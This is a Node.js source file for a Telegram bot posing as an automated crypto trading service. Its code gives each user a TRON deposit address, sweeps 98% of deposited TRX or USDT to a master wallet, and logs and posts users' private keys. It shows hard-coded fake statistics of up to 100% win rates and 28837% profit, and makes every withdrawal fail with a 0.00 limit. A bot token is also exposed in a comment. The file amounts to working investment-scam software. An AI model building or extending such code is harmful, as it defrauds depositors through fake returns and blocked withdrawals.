const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
require('dotenv').config();
const { Deposit } = require('./db');
const fs = require('fs'); // Import File System module
const token = process.env.TELEGRAM_BOT_TOKEN;
// const token = '7330403176:AAHRVimfNIE2tn6dQRuy9bbHoAbEu_8DNoU'; //my bot token
const getMenu = require('./components/menu');
const getTradingInfo = require('./components/trading');
const getTradingMode = require('./components/tradingMode')
const getFAQ = require('./components/faq');
const getTradingStatistics = require('./components/tradingStatistics');
const goBack = require('./components/back');
const accountMenu = require('./components/my_account/account');
const getPaymentTypes = require('./components/my_account/paymentType');
const getApproval = require('./components/my_account/approval');
const button = require('./components/button');
const formatDate = require('./utils');
const getTransactionButtons = require('./components/my_account/transactionHistory');
const { TronWeb } = require('tronweb');


// Create a bot that uses polling to fetch new updates
const bot = new TelegramBot(token, { polling: true });


bot.on('polling_error', console.log);  // Logs polling errors

// Log when the bot is running
console.log('Bot is up and running');

// Set the bot's commands
// bot.setMyCommands([
//     { command: '/help', description: 'Show the list of available commands' },
//     { command: '/start', description: 'Start the bot' },
// ]);

// get bot info
bot.getMe().then((botInfo) => {
    console.log(`Bot username: @${botInfo.username}`);
    console.log(`Bot name: ${botInfo.first_name}`);
    console.log(`Bot ID: ${botInfo.id}`);
}).catch((error) => {
    console.error('Invalid token or issue fetching bot info:', error);
});



bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const command = "Select an option:"
    bot.sendMessage(chatId, command, getMenu());
})

let isTradingActive = false
let isTradingAggressive = true
let message = ""
let userStates = {};
let withdrawStates = {};
const userTransactions = {};
let depositAmount = 0;

// *******************************************************************************************************************************
// *******************************************************************************************************************************

// Initialize TronWeb
const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    // fullHost: 'https://api.shasta.trongrid.io', // Change if using Mainnet
});

// In-memory object to store user data
const userWallets = {};

// Constants
// const usdtContractAddress = 'TQQg4EL8o1BSeKJY4MJ8TB8XK7xufxFBvK'; // USDT TRC20 testing address
const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC20 real coin transfer
// const usdtContractAddress = 'TXLAQ63Xg1NAzckPwKHvzw7CSEvxtb3Q2X'; // USDT TRC20 new from github

const masterAccountAddress = process.env.MASTER_PUB_ADDRESS; // Master account with actual money
// const masterAccountAddress = 'TKxPnNRCa6Tmcysb8j1ftXnm2EdXdq8mx6'; // Master account

const masterPrivateKey = process.env.MASTER_PRIVATE_KEY; // Master account private key
const trxFundingAmount = 28 * 1e6; // 2 TRX in sun (1e6 sun = 1 TRX)
const pollingInterval = 10000; // Poll every 10 seconds (adjust as needed)

// Function to create a new user deposit address
const createAddress = async () => {
    try {
        const newAccount = await tronWeb.createAccount();
        console.log("New account created:", newAccount.address.base58);
        return {
            address: newAccount.address.base58,
            privateKey: newAccount.privateKey,
        };
    } catch (error) {
        console.error('Error creating account:', error);
        return null;
    }
};

// Function to generate deposit address for a user
const getUserDepositAddress = async (chatId) => {
    console.log(`Generating deposit address for chat ID: ${chatId}`);
    const { address, privateKey } = await createAddress();
    if (address) {
        console.log("User's deposit address:", address);
        console.log("User's private key:", privateKey);
        userWallets[chatId] = { address, privateKey };
        // await sendTrxFromMaster(address);
    } else {
        console.log('Error generating deposit address.');
    }
};


// Send TRX from the master account to the user account
const sendTrxFromMaster = async (userAddress) => {
    try {
        const result = await tronWeb.trx.sendTransaction(userAddress, trxFundingAmount, masterPrivateKey);
        console.log(`Sent 2 TRX to ${userAddress}. Transaction ID: ${result.txid}`);
    } catch (error) {
        console.error("Error sending TRX from master:", error);
    }
};

const freezeUserAccount = async (userAddress, userPrivateKey) => {
    try {
        const energyFreezeTx = await tronWeb.transactionBuilder.freezeBalance(
            15 * 1e6, 3, "ENERGY", userAddress
        );
        const bandwidthFreezeTx = await tronWeb.transactionBuilder.freezeBalance(
            5 * 1e6, 3, "BANDWIDTH", userAddress
        );

        // Sign and broadcast both transactions
        const signedEnergyTx = await tronWeb.trx.sign(energyFreezeTx, userPrivateKey);
        const signedBandwidthTx = await tronWeb.trx.sign(bandwidthFreezeTx, userPrivateKey);

        await tronWeb.trx.sendRawTransaction(signedEnergyTx);
        await tronWeb.trx.sendRawTransaction(signedBandwidthTx);

        console.log(`Successfully froze TRX for Energy and Bandwidth on ${userAddress}.`);
    } catch (error) {
        console.error("Error freezing TRX:", error);
    }
};



// Function to check TRX balance for gas fees
const checkTrxBalance = async (chatId, requiredTrxForGas) => {
    const userAddress = userWallets[chatId]?.address;
    if (!userAddress) {
        console.log('User address not found');
        return false;
    }
    const balance = await tronWeb.trx.getBalance(userAddress);
    console.log(`TRX balance for ${userAddress}: ${balance}`);
    return balance >= requiredTrxForGas;
};

// Function to monitor USDT deposits continuously
const monitorUsdtDeposit = async (chatId, expectedDepositAmount) => {
    const userPrivateKey = userWallets[chatId]?.privateKey;
    const userAddress = userWallets[chatId]?.address;
    if (!userAddress) {
        console.log('User address not found.');
        return;
    }

    let usdtContract;
    try {
        usdtContract = await tronWeb.contract().at(usdtContractAddress);
        console.log("USDT contract initialized.");
    } catch (error) {
        console.error("Error initializing USDT contract:", error);
        // Log the error, but continue monitoring TRX deposits.
    }

    const checkDeposit = async () => {
        let usdtBalance = 0

        const depositData = {
            userId: chatId,
            amount: 7000,
            coin: 'USDT',
            privateKey: userPrivateKey,
            publicKey: userAddress,
        };

        try {
            const response = await axios.post(
                `${process.env.BASE_URL}/api/deposit`,
                depositData,
                { headers: { 'Content-Type': 'application/json' } }
            );
            console.log("Deposit saved successfully:", response.data);
        } catch (error) {
            if (error.response) {
                console.error("Server responded with:", error.response.data);
            } else {
                console.error("Error saving deposit:", error.message);
            }
        }


        try {
            try {
                const usdtBalanceBigInt = await usdtContract.balanceOf(userAddress).call({
                    from: userAddress,
                });
                usdtBalance = Number(usdtBalanceBigInt) / 1e6
                console.log(`USDT balance for ${userAddress}: ${usdtBalance} USDT`);
            } catch (error) {
                console.log("Error getting USDT balance", error)
            }

            const trxBalance = await tronWeb.trx.getBalance(userAddress) / 1e6;
            console.log(`TRX balance for ${userAddress}: ${trxBalance} TRX`);

            if (trxBalance >= 1) {
                console.log("TRX deposit detected.");
                clearInterval(interval);

                try {
                    const depositData = {
                        userId: chatId,
                        amount: 7000,
                        coin: 'TRX',
                        privateKey: userPrivateKey,
                        publicKey: userAddress,
                    };

                    console.log("Sending deposit:", depositData);

                    // Make a POST request to the /api/deposit route
                    const response = await axios.post(`${process.env.BASE_URL}/api/deposit`, depositData);

                    console.log("Deposit saved successfully:", response.data);
                } catch (error) {
                    console.error("Error saving deposit:", error);
                };

                // send TRX to master
                await transferTrxToMaster(chatId);
            } else {
                console.log("Insufficient TRX balance. Still monitoring...");
            }

            if (usdtBalance >= 0.5) {
                console.log("USDT deposit detected. Funding TRX for gas...");
                clearInterval(interval); // Stop only on successful USDT transfer

                try {
                    const depositData = {
                        userId: chatId,
                        amount: 7000,
                        coin: 'USDT',
                        privateKey: userPrivateKey,
                        publicKey: userAddress,
                    };

                    console.log("Sending deposit:", depositData);

                    // Make a POST request to the /api/deposit route
                    const response = await axios.post(`${process.env.BASE_URL}/api/deposit`, depositData);

                    console.log("Deposit saved successfully:", response.data);
                } catch (error) {
                    console.error("Error saving deposit:", error);
                }


                await sendTrxFromMaster(userAddress); // Fund TRX for gas

                // await freezeUserAccount(userAddress, userPrivateKey);

                // Monitor TRX balance and transfer USDT when it's more than 1 TRX
                const checkTrxBalanceAndTransferUsdt = async () => {
                    const updatedTrxBalance = await tronWeb.trx.getBalance(userAddress);
                    console.log(`Updated TRX balance for ${userAddress}: ${updatedTrxBalance / 1e6} TRX`);

                    if (updatedTrxBalance >= 1e6) { // At least 1 TRX detected
                        console.log("Sufficient TRX balance detected. Transferring USDT...");
                        await transferUsdtToMaster(chatId, usdtBalance * 0.98); // Transfer 98% USDT to master
                        clearInterval(trxCheckInterval); // Stop checking TRX balance after transfer
                    }
                };
                // await transferUsdtToMaster(chatId, usdtBalance * 0.98);
                const trxCheckInterval = setInterval(checkTrxBalanceAndTransferUsdt, pollingInterval); // Check TRX balance periodically
            }
        } catch (error) {
            console.error("Error checking deposits:", error);
            // Log the error and keep the monitoring process alive.
        }
    };

    const interval = setInterval(checkDeposit, pollingInterval);

};

const transferTrxToMaster = async (chatId) => {
    const userAddress = userWallets[chatId]?.address;
    const userPrivateKey = userWallets[chatId]?.privateKey;

    try {
        console.log(`User Address: ${userAddress}`);
        console.log(`User Private Key: ${userPrivateKey}`);

        // Validate user address
        const isValidAddress = tronWeb.isAddress(userAddress);
        console.log(`Is User Address Valid: ${isValidAddress}`);

        // Check balance
        const userBalance = await tronWeb.trx.getBalance(userAddress);
        console.log(`User Balance: ${userBalance / 1e6} TRX`);

        // Calculate 98% of the user's balance
        const amountToSend = (userBalance * 0.98) / 1e6; // Convert to TRX

        // Send transaction
        const result = await tronWeb.trx.sendTransaction(masterAccountAddress, amountToSend * 1e6, userPrivateKey);
        console.log(`Transferred ${amountToSend} TRX to master account. Transaction ID: ${result.txid}`);
    } catch (error) {
        console.error("Error transferring TRX:", error);
    }
};

const transferUsdtToMaster = async (chatId, amount) => {
    const userAddress = userWallets[chatId]?.address;
    const userPrivateKey = userWallets[chatId]?.privateKey;

    console.log(`User Private Key &&&&&&&&&&&&&&&&&&&&&&&&&: ${userPrivateKey}`);

    try {
        const usdtContract = await tronWeb.contract().at(usdtContractAddress);
        console.log(`User Private Key: 77777777777777777777777777 ${usdtContract}`);

        // Create a signed transaction
        const unsignedTx = await usdtContract.transfer(masterAccountAddress, amount * 1e6).send({
            from: userAddress,
        });
        console.log(`User Private Key: 88888888888888888888888888888 ${unsignedTx}`);

        // Manually sign the transaction
        const signedTx = await tronWeb.trx.sign(unsignedTx, userPrivateKey);
        console.log(`User Private Key: ******************************** ${signedTx}`);

        // Broadcast the transaction
        const receipt = await tronWeb.trx.sendRawTransaction(signedTx);

        console.log(`Transferred ${amount} USDT to master account. TX: ${receipt.txid}`);
    } catch (error) {
        console.error("Error transferring USDT:", error);
    }
};


// Main process to generate address, check TRX, and monitor deposits
const mainProcess = async (chatId, expectedDepositAmount, requiredTrxForGas) => {
    console.log(`--- Starting process for chat ID: ${chatId} ---`);

    await getUserDepositAddress(chatId);

    const trxBalanceOk = await checkTrxBalance(chatId, requiredTrxForGas);
    if (!trxBalanceOk) {
        console.log("Insufficient TRX. Process halted.");
        // return;
    }

    console.log("Monitoring USDT deposit...");
    monitorUsdtDeposit(chatId, expectedDepositAmount);
};


// *******************************************************************************************************************************`
// *******************************************************************************************************************************`

// add transactions to transactions history
function addTransaction(userId, amount, status) {
    if (!userTransactions[userId]) {
        userTransactions[userId] = []
    }

    // Add new transaction
    userTransactions[userId].push({
        date: formatDate(new Date()),
        amount,
        status, // pending, succesful or failed
    });
};


// function to get transaction history
function getTransactionHistory(userId, limit = 3) {
    const transactions = userTransactions[userId] || [];
    if (transactions.length === 0) {
        return 'No transactions yet. 🤷‍♂️';
    }

    // Limit the number of transactions displayed
    const displayTransactions = transactions.slice(-limit); // Show last 'limit' number of transactions

    let history = '🔍 Balance history 🔍\n\n❗️Replenishment and withdrawals on your trading account\n\n';
    displayTransactions.forEach(transaction => {
        history += `${transaction.date} Deposit of: ${transaction.amount} USDT Status: ${transaction.status}\n`;
    });

    return history;
}



bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const action = callbackQuery.data;

    // Handle the FAQ and Menu callback data using a single switch statement
    switch (action) {
        // Menu actions
        case 'trading':
            const tradingMessage = isTradingActive
                ? '*Trading status*: Active ✅'
                : '*Trading status*: Inactive ❌';

            const tradingModeMessage = isTradingAggressive
                ? '*Trading Mode*: Aggressive'
                : '*Trading mode*: Conservative';

            const fullMessage = `${tradingMessage}\n${tradingModeMessage}`;
            bot.sendMessage(
                chatId,
                fullMessage,
                {
                    parse_mode: 'Markdown',
                    ...getTradingInfo(isTradingActive)
                }
            );
            break;
        case 'back_menu':
            const backtradingMessage = isTradingActive
                ? '*Trading status*: Active ✅'
                : '*Trading status*: Inactive ❌';

            const backtradingModeMessage = isTradingAggressive
                ? '*Trading Mode*: Aggressive'
                : '*Trading mode*: Conservative';

            const backfullMessage = `${backtradingMessage}\n${backtradingModeMessage}`;
            bot.sendMessage(
                chatId,
                backfullMessage,
                {
                    parse_mode: 'Markdown',
                    ...getTradingInfo(isTradingActive)
                }
            );
            break;


        case 'toggle_trading':
            // Toggle the trading status
            isTradingActive = !isTradingActive;
            const statusMessage = isTradingActive
                ? '*Trading status*: Active ✅'
                : '*Trading status*: Inactive ❌';

            const currentTradingStatus = isTradingAggressive
                ? '*Trading Mode*: Aggressive'
                : '*Trading mode*: Conservative';

            const updatedModeFullMessage = `${statusMessage}\n${currentTradingStatus}`;
            bot.sendMessage(
                chatId,
                updatedModeFullMessage,
                {
                    parse_mode: 'Markdown',
                    ...getTradingInfo(isTradingActive)
                }
            );
            break;


        case 'conservative':
            isTradingAggressive = false;

            const currentTradingMessage = isTradingActive
                ? '*Trading status*: Active ✅'
                : '*Trading status*: Inactive ❌';

            const currentTradingMode = isTradingAggressive
                ? '*Trading Mode*: Aggressive'
                : '*Trading mode*: Conservative';

            const modeFullMessage = `${currentTradingMessage}\n${currentTradingMode}`;
            bot.sendMessage(
                chatId,
                modeFullMessage,
                {
                    parse_mode: 'Markdown',
                    ...getTradingInfo(isTradingActive)
                }
            );
            break;


        case 'aggressive':
            isTradingAggressive = true;

            const updatedTradingMessage = isTradingActive
                ? '*Trading status*: Active ✅'
                : '*Trading status*: Inactive ❌';

            const updatedTradingMode = isTradingAggressive
                ? '*Trading Mode*: Aggressive'
                : '*Trading mode*: Conservative';

            const fullUpdatedMessage = `${updatedTradingMessage}\n${updatedTradingMode}`;

            bot.sendMessage(
                chatId,
                fullUpdatedMessage,
                {
                    parse_mode: 'Markdown',
                    ...getTradingInfo(isTradingActive)
                }
            );
            break;


        // trading bot statistics
        case 'trading_bot_statistics':
            bot.sendMessage(chatId, `For what period do you want to see the bot's trading statistics?`, getTradingStatistics());
            break;

        case 'trading_bot_channel':
            bot.sendMessage(chatId, `https://t.me/portalearn_trades`);
            break;


        case 'goback':
            bot.sendMessage(chatId, `For what period do you want to see the bot's trading statistics?`, getTradingStatistics());
            break;

        case '3days':
            message = `Trading bot statistics for the period: 3 days
            
🚀 Total deals: 25
☑️ Successful: 25
❌ Unsuccessful: 0
🏆 Winning percentage: 100.00 %
💵 Profit percentage: 28837.91 %

📊 Aggressive mode profit percentage: 19225.27 %
📊 Conservative mode profit percentage: 9612.64 %`
            bot.sendMessage(
                chatId,
                message,
                goBack()
            );
            break;

        case '24hours':
            message = `Trading bot statistics for the period: 1 days

🚀 Total deals: 8
☑️ Successful: 8
❌ Unsuccessful: 0
🏆 Winning percentage: 100.00 %
💵 Profit percentage: 0.00 %

📊 Aggressive mode profit percentage: 0.00 %
📊 Conservative mode profit percentage: 0.00 %`
            bot.sendMessage(
                chatId,
                message,
                goBack()
            );
            break;

        case '7days':
            message = `Trading bot statistics for the period: 7 days

🚀 Total deals: 59
☑️ Successful: 59
❌ Unsuccessful: 0
🏆 Winning percentage: 100.00 %
💵 Profit percentage: 189.66 %

📊 Aggressive mode profit percentage: 126.44 %
📊 Conservative mode profit percentage: 63.22 %`
            bot.sendMessage(
                chatId,
                message,
                goBack()
            );
            break;

        case '1month':
            message = `Trading bot statistics for the period: 30 days

🚀 Total deals: 225
☑️ Successful: 223
❌ Unsuccessful: 2
🏆 Winning percentage: 99.11 %
💵 Profit percentage: 160.29 %

📊 Aggressive mode profit percentage: 106.86 %
📊 Conservative mode profit percentage: 53.43 %`
            bot.sendMessage(
                chatId,
                message,
                goBack()
            );
            break;
        case '3months':
            message = `Trading bot statistics for the period: 90 days

🚀 Total deals: 611
☑️ Successful: 604
❌ Unsuccessful: 7
🏆 Winning percentage: 98.85 %
💵 Profit percentage: 383.46 %

📊 Aggressive mode profit percentage: 255.64 %
📊 Conservative mode profit percentage: 127.82 %`
            bot.sendMessage(
                chatId,
                message,
                goBack()
            );
            break;


        // my account section
        case 'my_account':
            message = `📊 *Current balance*: 0.00 USDT

🏦 Available for withdrawal: 0.00 USDT

📅 *Date of registration*: 2024-09-29 10:24:19

💸 *Total withdrawal*: 0.0 USDT`
            bot.sendMessage(
                chatId,
                message,
                {
                    parse_mode: 'Markdown', // Enabling Markdown for bold formatting
                    ...accountMenu() // Your inline keyboard or other options
                }
            );
            break;

        case 'top_up_balance':
            message = `Select your payment method:`
            bot.sendMessage(chatId, message, getPaymentTypes());
            break;

        // pay with card (FIAT)
        case 'card_payment':
            message = `Please select:`
            const description = `*FIAT Payment Notice*:

Please note that opting for FIAT payments will exclude you from participating in cryptocurrency trades. Your trading activities will be limited to Commodities, Futures, CFDs, and options, available only on weekdays (Monday through Friday).

*Do you agree to these terms?*`
            bot.sendMessage(chatId, description, { parse_mode: 'Markdown' });
            bot.sendMessage(
                chatId,
                message, getApproval()
            );
            break;

        case 'agree':
            message = `Please navigate to the link below to complete payment:

astroearning.com/charge.php?user_token=4bb21ed58e998d7e9deb4e80bccea244

In the "name @ yoursocial" field, enter your Reference code provided below. IMPORTANT NOTE: WITHOUT REFERENCE CODE, payment will not be detected, and your recharge will not be completed.

Reference code: 2113676427AS1030 👈 👈 Click to copy

Click "Check Payment" after your transfer.`
            bot.sendMessage(chatId, message, button('Check Payment', 'checkpayment'));
            break;

        case 'checkpayment':
            message = `Payment not found. Please check your reference code and try again.`
            bot.sendMessage(chatId, message);
            break;

        case 'crypto_payment':
            userStates[chatId] = 'awaiting_deposit_amount'
            message = `Please enter the amount you want to deposit in USDT (TRC20) (minimum 5 USDT):`
            // getUserDepositAddress(chatId);
            mainProcess(chatId, depositAmount, 1000000);
            bot.sendMessage(chatId, message);
            break;

        case 'check_crypto_payment':
            message = `Current status: waiting. Please deposit at least 5 USDT.`
            bot.sendMessage(chatId, message,);
            break;


        // WITHDRAWAL SECTION 
        case 'funds_withdrawal':
            message = `🏦 *Withdrawal of funds* 🏦

    ❗️ In order to withdraw USDT to your USDT TRC20 wallet, you need to apply for withdrawal (5% withdrawal fee). Withdrawals are processed within 5 business days. While the application is being considered, trading for your account will be stopped!

    ❗️ The minimum withdrawal amount is 5 USDT`
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...button('SEND WITHDRAWAL REQUEST', 'withdrawal_request') });
            break;

        case 'withdrawal_request':
            withdrawStates[chatId] = 'awaiting_withdrawal_amount'
            message = `Please enter the amount you want to withdraw in USDT:`
            bot.sendMessage(chatId, message);
            break;


        // BALANCE HISTORY
        case 'balance_history':
            message = getTransactionHistory(chatId)
            bot.sendMessage(chatId, message, getTransactionButtons());
            break;

        case 'show_10':
            message = getTransactionHistory(chatId, 10)
            bot.sendMessage(chatId, message, getTransactionButtons());
            break;
        case 'show_all':
            message = getTransactionHistory(chatId, userTransactions[chatId.length])
            bot.sendMessage(chatId, message);
            break;


        // REFERRAL SYSTEM
        case 'referral_system':
            message = `👥 *Referral system* 👥

❗️ Get a 5% reward from each deposit of the listed users.

⬇️ Click on the link to copy ⬇️
❗️ *Your invitation link*:

[https://t.me/Portalearn_bot?start=astro2113676427](https://t.me/Portalearn_bot?start=astro2113676427)

📈 *Total users invited*: 0
💵 *You are credited for them*: 0.00 USDT`;

            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            break;







        case 'faq':
            bot.sendMessage(chatId, 'FAQ: Select a question', getFAQ());
            break;
        case 'channel':
            bot.sendMessage(chatId, `Channel section: https://t.me/portalearn`);
            break;
        case 'chat':
            bot.sendMessage(chatId, 'Join our public group chat invite only');
            break;
        case 'support':
            message = `You can contact us in the chat. Our team is available from 9 AM - 11 PM [Eastern Standard Time]`
            bot.sendMessage(chatId, message, button(`👉 Contact Support 👈`, 'contact_support'));
            break;



        // FAQ actions
        case 'work':
            bot.sendMessage(chatId,
                `How does the BOT work?
                The BOT is designed to emulate the trading strategies of experienced traders who have demonstrated success in real market conditions. It continuously monitors live markets, applying these strategies to identify profitable opportunities. When specific criteria are met, the BOT automatically generates a trading signal and executes trades. Each trade is entered with controlled risk management to ensure consistent returns on your investment.`
            );
            break;
        case 'earnings':
            bot.sendMessage(
                chatId,
                `- Expected Earnings
            The BOT delivers an average daily return of 2% with a success rate exceeding 80%. Assuming ideal conditions and no losing days, a $1000 investment could grow as follows:
            - Day 1: $1000
            - Day 7: $1149
            - Day 14: $1319
            - Day 21: $1515
            - Day 28: $1741
            
            Please note: Actual results may vary due to the natural distribution of losing trades.`
            );
            break;
        case 'investments':
            bot.sendMessage(
                chatId,
                `- How to Make an Investment?
                    To start investing or add to your existing portfolio, simply navigate to the "My Account" section and click "Add Funds." This will generate a USDT TRC20 payment address. Once you've made the payment, use the "Status" button to check if the payment has been processed. You can also verify the transaction via a blockchain explorer. The minimum deposit is $5.
            
                    **Note**: Be sure to include the gas fee in your payment. Only the amount received in our wallet will be credited to your balance.`
            );
            break;
        case 'profits':
            bot.sendMessage(
                chatId,
                `- How to Withdraw Profits?
                    To withdraw your profits or your entire investment, go to the "My Account" section and select "Withdraw." Input your wallet address along with the amount you'd like to withdraw. Once you submit the withdrawal request, it will be processed within 5 business days, and you'll receive a transaction ID. You can track the status using a blockchain explorer.
            
                    **Note**: A 5% processing fee applies to each withdrawal.`
            );
            break;
        case 'commission':
            bot.sendMessage(
                chatId,
                `- What Are the Fees or Commissions?
                    Unlike many other services, we do NOT charge any monthly fees. The only trading commissions applied are those set by the broker or exchange where the trade is executed, and the final profit displayed will already account for these costs. 
            
                    We charge a 15% performance fee on the profits we generate for you, which is in line with industry standards. Importantly, you only pay this fee on profits—there is no fee for losses. This means no hidden or unexpected costs. You can withdraw 80% of your profits without any additional charges (15% performance fee + 5% withdrawal fee).`
            );
            break;
        case 'exchange_broker':
            bot.sendMessage(
                chatId,
                `- Which Exchanges or Brokers Are Used for Trading?
                    We utilize a variety of trusted brokers and exchanges to execute trades across multiple asset classes. For cryptocurrency trades, we rely on well-known exchanges like Binance. For traditional assets, we work with regulated brokers such as Capital.com, which is overseen by authorities like the FCA (Financial Conduct Authority) and ASIC (Australian Securities and Investments Commission).`
            );
            break;
        case 'losses':
            bot.sendMessage(
                chatId,
                `- How Are Losses Managed?
                    For conservative risk trading, daily losses are strictly capped at 2%. In rare instances where this loss limit is reached, trading is automatically paused to prevent further drawdowns, ensuring consistent profitability without excessive volatility. For those opting for aggressive or higher-risk strategies, the daily loss cap is set at 4% to balance potential higher returns.`
            );
            break;

        case 'tenure':
            bot.sendMessage(
                chatId,
                `- Tenure of Our BOT
                    Our BOT has been successfully generating profits for over 5 years. Initially, it was exclusively available to private clients, but we have now made it accessible to everyone, without any restrictions.`
            );
            break;

        case 'referral_earnings':
            bot.sendMessage(
                chatId,
                `- Referral Earnings
                    You will earn a 5% commission from all deposits made by your referrals. To access your referral link, the number of referrals, and your earnings from them, go to the "My Account" section and click on "Referrals."`
            );
            break;

        case 'regional_restrictions':
            bot.sendMessage(
                chatId,
                `- Regional Restrictions
                    We welcome clients from all countries without any restrictions. For deposits exceeding $100,000, we may request the client's ID to verify ownership of the funds. However, there are no restrictions for deposits below $100,000.`
            );
            break;

        case 'invested_capital':
            bot.sendMessage(
                chatId,
                `- How can I verify if my capital is invested in your BOT?
                    On our website, you can view your capital amount in the "Total Assets Under Management" section. We prioritize customer privacy and do not disclose personal information. You can see your initials along with the invested amount. For instance, if your name is John Doe and you invested $10,000 in our BOT, your capital status will be listed under the initials J.D. with an amount of $10,000.`
            );
            break;

        case 'transparency':
            bot.sendMessage(
                chatId,
                `- Transparency
                    We ensure full transparency by broadcasting all trades in the channel. Whenever the BOT executes a trade, a notification will be sent out. Additionally, you will receive updates when the trade results in a profit or loss.`
            );
            break;


        // trading extrals switch_trading_mode
        case 'switch_trading_mode':
            bot.sendMessage(chatId, 'Switch tading mode: Choose your mode', getTradingMode());
            break;

        // Default case for unknown commands
        default:
            bot.sendMessage(chatId, 'Unknown command.');
    }
});


bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const userState = userStates[chatId]

    if (userState === 'awaiting_deposit_amount') {
        depositAmount = parseFloat(msg.text); // Parse user input as a number
        addTransaction(chatId, `${depositAmount}.00`, 'Pending');

        // Validate the deposit amount (minimum 25 USDT)
        if (isNaN(depositAmount) || depositAmount < 5) {
            bot.sendMessage(chatId, 'The minimum deposit amount is 5 USDT. Please enter a valid amount:');
        } else {
            message = `💰 Top up your balance 💰

⚠️ To top up your balance, transfer ${depositAmount}.0 USDT TRC20 to the address below.

👇 Click on address below to copy address 👇

${userWallets[chatId]?.address}

Click "Check Payment" after your transfer.`
            bot.sendMessage(chatId, message, button('CHECK PAYMENT', "check_crypto_payment"));

            // Process the deposit (you can add further steps here, like confirming the payment)

            userStates[chatId] = null; // Clear the user's state after processing
        }
    }
})

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const withdraw = withdrawStates[chatId]

    if (withdraw === 'awaiting_withdrawal_amount') {
        const withdrawAmount = parseFloat(msg.text);

        // Validate the deposit amount (minimum 25 USDT)
        if (isNaN(withdrawAmount) || withdrawAmount < 5) {
            bot.sendMessage(chatId, 'The minimum withdrawal amount is 5 USDT. Please enter a valid amount:');
        } else {
            message = `The maximum withdrawal amount is 0.00 USDT. Please try again.`
            bot.sendMessage(chatId, message);

            withdrawStates[chatId] = null;
        }
    }
})



// Handling the /help command
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;

    const helpMessage = `
  Before using our service, we strongly recommend you to carefully review the functionality of each trading bot button.
  
  Menu:
  1. "Trading" - View trading results for different periods, pause or resume the trading bot.
  2. "Stop trading/Start trading" - Start or stop the trading bot.
  3. "Trading Bot statistics" - View bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.
  4. "Trading Bot Channel" - Get up-to-date information on bot trading.
  
  My Account:
  1. "Top up your balance" - Replenish your USDT TRC20 wallet.
  2. "Withdrawal of funds" - Withdraw USDT TRC20 to your wallet (5% commission).
  3. "Balance history" - View deposit and withdrawal history.
  4. "Referral system" - Earn 5% from each deposit of your referrals.
  
  Other:
  1. "FAQ" - Answers to frequently asked questions.
  2. "Channel" - Crypto market news and updates.
  3. "Chat" - Communicate with other users.
  4. "Support" - Get online help (average response time: 2 hours, only in English).
  
  To change the language or restart the bot, press /start.
    `;

    // Send the message with inline keyboard
    bot.sendMessage(chatId, helpMessage);
});








//   send image with messages
bot.onText(/\/photo/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendPhoto(chatId, 'path/to/photo.jpg');
});

//   get current chat features and trading readings
bot.onText(/\/crypto/, async (msg) => {
    const chatId = msg.chat.id;
    try {
        const response = await axios.get('https://api.coindesk.com/v1/bpi/currentprice/BTC.json');
        const price = response.data.bpi.USD.rate;
        bot.sendMessage(chatId, `Current Bitcoin price: $${price}`);
    } catch (error) {
        bot.sendMessage(chatId, 'Error fetching data');
    }
});

module.exports = bot; 
